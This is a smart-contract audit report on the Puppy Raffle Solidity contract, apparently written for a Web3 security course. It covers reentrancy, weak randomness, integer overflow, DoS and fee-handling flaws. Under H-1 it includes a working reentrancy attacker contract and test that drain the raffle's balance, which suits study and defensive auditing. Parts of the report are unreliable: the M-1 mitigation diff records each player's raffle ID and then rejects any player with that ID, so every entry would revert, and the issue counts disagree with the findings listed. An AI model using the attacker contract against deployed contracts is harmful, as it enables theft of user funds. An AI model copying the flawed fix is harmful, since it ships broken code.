Puppy Raffle — Security Audit Report
Prepared by: [Your Name]
Date: January 12, 2024
Version: 1.0
Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5

Table of Contents

Protocol Summary
Disclaimer
Risk Classification
Audit Details
Executive Summary
Findings

High
Medium
Low
Informational
Gas




Protocol Summary
This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

Call the enterRaffle function with the following parameters:

address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.


Duplicate addresses are not allowed.
Users are allowed to get a refund of their ticket & value if they call the refund function.
Every X seconds, the raffle will be able to draw a winner and be minted a random puppy.
The owner of the protocol will set a feeAddress to take a cut of the value, and the rest of the funds will be sent to the winner of the puppy.


Disclaimer
The [Your Name] team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

Risk Classification
ImpactHighMediumLowHighHH/MMLikelihoodMediumH/MMM/LLowMM/LL
Severity is determined using the CodeHawks severity matrix.

Audit Details
Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5
Scope
./src/
└── PuppyRaffle.sol
Roles

Owner — Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.
Player — Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through the refund function.


Executive Summary
I loved auditing this codebase. A great exercise in identifying classic Solidity vulnerabilities across reentrancy, integer overflow, weak randomness, and DoS attack vectors.
Issues Found
SeverityNumber of Issues FoundHigh3Medium3Low1Info7Gas2Total16

Findings
High

[H-1] Reentrancy attack in PuppyRaffle::refund allows entrant to drain contract balance
Description:
The PuppyRaffle::refund function does not follow CEI/FREI-PI and as a result, enables participants to drain the contract balance.
In the PuppyRaffle::refund function, we first make an external call to the msg.sender address, and only after making that external call do we update the players array.
javascriptfunction refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);

@>  players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
A player who has entered the raffle could have a fallback/receive function that calls PuppyRaffle::refund again and claim another refund. They could continue to cycle this until the contract balance is drained.
Impact: All fees paid by raffle entrants could be stolen by the malicious participant.
Proof of Concept:

User enters the raffle.
Attacker sets up a contract with a fallback function that calls PuppyRaffle::refund.
Attacker enters the raffle.
Attacker calls PuppyRaffle::refund from their contract, draining the contract balance.

<details>
<summary>Proof of Code</summary>
Add the following code to PuppyRaffleTest.t.sol:
javascriptcontract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    fallback() external payable {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }
}

function testReentrance() public playersEntered {
    ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
    vm.deal(address(attacker), 1e18);
    uint256 startingAttackerBalance = address(attacker).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    attacker.attack();

    uint256 endingAttackerBalance = address(attacker).balance;
    uint256 endingContractBalance = address(puppyRaffle).balance;
    assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
    assertEq(endingContractBalance, 0);
}
</details>
Recommended Mitigation:
Update the players array before making the external call. Move the event emission up as well.
diff    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        (bool success,) = msg.sender.call{value: entranceFee}("");
        require(success, "PuppyRaffle: Failed to refund player");
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }

[H-2] Weak randomness in PuppyRaffle::selectWinner allows anyone to choose winner
Description:
Hashing msg.sender, block.timestamp, and block.difficulty together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.
Impact: Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy — essentially making it so that all puppies have the same rarity.
Proof of Concept:

Validators can know ahead of time the block.timestamp and block.difficulty and use that knowledge to predict when/how to participate. See the solidity blog on prevrandao. block.difficulty was recently replaced with prevrandao.
Users can manipulate the msg.sender value to result in their index being the winner.

Using on-chain values as a randomness seed is a well-known attack vector in the blockchain space.
Recommended Mitigation: Use an oracle for randomness such as Chainlink VRF.

[H-3] Integer overflow of PuppyRaffle::totalFees loses fees
Description:
In Solidity versions prior to 0.8.0, integers were subject to integer overflows.
javascriptuint64 myVar = type(uint64).max;
// myVar will be 18446744073709551615
myVar = myVar + 1;
// myVar will be 0
Impact: In PuppyRaffle::selectWinner, totalFees are accumulated for the feeAddress to collect later in withdrawFees. However, if the totalFees variable overflows, the feeAddress may not collect the correct amount of fees, leaving fees permanently stuck in the contract.
Proof of Concept:

Conclude a raffle of 4 players to collect some fees.
Have 89 additional players enter a new raffle, and conclude that raffle.
totalFees will be:

javascripttotalFees = totalFees + uint64(fee);
// substituted
totalFees = 800000000000000000 + 17800000000000000000;
// due to overflow:
totalFees = 153255926290448384;

withdrawFees will now revert due to:

javascriptrequire(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
<details>
<summary>Proof of Code</summary>
```javascript
function testTotalFeesOverflow() public playersEntered {
    vm.warp(block.timestamp + duration + 1);
    vm.roll(block.number + 1);
    puppyRaffle.selectWinner();
    uint256 startingTotalFees = puppyRaffle.totalFees();
uint256 playersNum = 89;
address[] memory players = new address[](playersNum);
for (uint256 i = 0; i < playersNum; i++) {
    players[i] = address(i);
}
puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
vm.warp(block.timestamp + duration + 1);
vm.roll(block.number + 1);
puppyRaffle.selectWinner();

uint256 endingTotalFees = puppyRaffle.totalFees();
console.log("ending total fees", endingTotalFees);
assert(endingTotalFees < startingTotalFees);

vm.prank(puppyRaffle.feeAddress());
vm.expectRevert("PuppyRaffle: There are currently players active!");
puppyRaffle.withdrawFees();
}
</details>

**Recommended Mitigation:**

1. Use a newer version of Solidity (`^0.8.18`) that does not allow integer overflows by default.
2. Use `uint256` instead of `uint64` for `totalFees`.
```diff
- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;

Remove the balance check in PuppyRaffle::withdrawFees.

diff- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");

Medium

[M-1] Looping through players array to check for duplicates in PuppyRaffle::enterRaffle is a potential DoS vector
Description:
The PuppyRaffle::enterRaffle function loops through the players array to check for duplicates. The longer the array, the more checks a new player will have to make. Gas costs for players who enter early will be dramatically lower than those who enter later.
Impact:

Gas costs for raffle entrants will greatly increase as more players enter.
Front-running opportunities are created for malicious users to increase gas costs of other users, causing their transactions to fail.

Proof of Concept:

1st 100 players: 6,252,039 gas
2nd 100 players: 18,067,741 gas — more than 3x as expensive!

javascript// Check for duplicates
@> for (uint256 i = 0; i < players.length - 1; i++) {
    for (uint256 j = i + 1; j < players.length; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}
Recommended Mitigation: Use a mapping to check for duplicates in constant time.
diff+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;

    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
    }

    function selectWinner() external {
+       raffleId = raffleId + 1;
        ...
    }

[M-2] Balance check on PuppyRaffle::withdrawFees enables griefers to selfdestruct a contract to block withdrawals
Description:
The withdrawFees function checks that totalFees equals address(this).balance. A user could selfdestruct a contract with ETH in it, forcing funds into PuppyRaffle and breaking this check.
javascriptfunction withdrawFees() external {
@>  require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ...
}
Impact: A malicious user could front-run a withdrawFee transaction and permanently block the feeAddress from withdrawing.
Proof of Concept:

PuppyRaffle has 800 wei and 800 totalFees.
Malicious user sends 1 wei via selfdestruct.
feeAddress can no longer withdraw.

Recommended Mitigation:
diff    function withdrawFees() external {
-       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }

[M-3] Unsafe cast of PuppyRaffle::fee loses fees
Description:
In PuppyRaffle::selectWinner, a uint256 is unsafely cast to uint64. If the value exceeds type(uint64).max (~18 ETH), it will be truncated.
javascript@> totalFees = totalFees + uint64(fee);
Impact: The feeAddress will not collect the correct amount of fees, leaving funds permanently stuck in the contract.
Recommended Mitigation:
diff- uint64 public totalFees = 0;
+ uint256 public totalFees = 0;

- totalFees = totalFees + uint64(fee);
+ totalFees = totalFees + fee;

Low

[L-1] Smart contract wallet raffle winners without a receive or fallback will block the start of a new contest
Description:
If the winner is a smart contract wallet that rejects payment, the selectWinner function will revert and the lottery cannot restart.
Impact: True winners cannot get paid out, and the raffle is permanently halted.
Recommended Mitigation: Favor pull-payments over push-payments — let the winner claim their prize via a separate function instead of auto-sending during selectWinner.

Informational

[I-1] Floating pragmas
Contracts should use strict versions of Solidity to ensure consistent deployment behavior.
diff- pragma solidity ^0.7.6;
+ pragma solidity 0.7.6;

[I-2] Magic Numbers
All number literals should be replaced with named constants for readability and maintainability.
diff+ uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
+ uint256 public constant FEE_PERCENTAGE = 20;
+ uint256 public constant TOTAL_PERCENTAGE = 100;

- uint256 prizePool = (totalAmountCollected * 80) / 100;
- uint256 fee = (totalAmountCollected * 20) / 100;
+ uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
+ uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;

[I-3] Test Coverage Below 90%
File% Lines% Statements% Branches% Funcsscript/DeployPuppyRaffle.sol0.00% (0/3)0.00% (0/4)100.00% (0/0)0.00% (0/1)src/PuppyRaffle.sol82.46% (47/57)83.75% (67/80)66.67% (20/30)77.78% (7/9)Total80.60% (54/67)81.52% (75/92)65.62% (21/32)75.00% (9/12)
Recommended Mitigation: Increase test coverage to 90%+, especially for the Branches column.

[I-4] Zero Address Validation Missing
feeAddress is never validated against address(0) in the constructor or changeFeeAddress. This could result in fees being permanently lost.
Recommended Mitigation: Add zero address checks wherever feeAddress is updated.

[I-5] _isActivePlayer is Never Used and Should Be Removed
diff-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }

[I-6] Unchanged Variables Should Be constant or immutable
VariableRecommended ModifierPuppyRaffle.commonImageUriconstantPuppyRaffle.rareImageUriconstantPuppyRaffle.legendaryImageUriconstantPuppyRaffle.raffleDurationimmutable

[I-7] Potentially Erroneous Active Player Index
getActivePlayerIndex returns 0 for both non-existent players and the player at index 0. This causes confusion.
Recommended Mitigation: Return type(uint256).max to signal an inactive player.

[I-8] Zero Address May Be Erroneously Considered an Active Player
After a refund, players[index] is set to address(0). The getActivePlayerIndex function does not skip zero addresses, which could cause the zero address to be treated as an active player.
Recommended Mitigation: Skip zero addresses when iterating in getActivePlayerIndex, and prevent address(0) from being registered in enterRaffle.

Gas

[G-1] Unchanged State Variables Should Be constant or immutable
Reading from storage is much more expensive than reading a constant or immutable variable.

PuppyRaffle::raffleDuration → immutable
PuppyRaffle::commonImageUri → constant
PuppyRaffle::rareImageUri → constant
PuppyRaffle::legendaryImageUri → constant


[G-2] Storage Variables in a Loop Should Be Cached
Every call to players.length in a loop reads from storage. Cache it in memory first.
diff+ uint256 playersLength = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playersLength - 1; i++) {
-     for (uint256 j = i + 1; j < players.length; j++) {
+     for (uint256 j = i + 1; j < playersLength; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
}

Report generated as part of the Cyfrin Updraft Web3 Security Course.
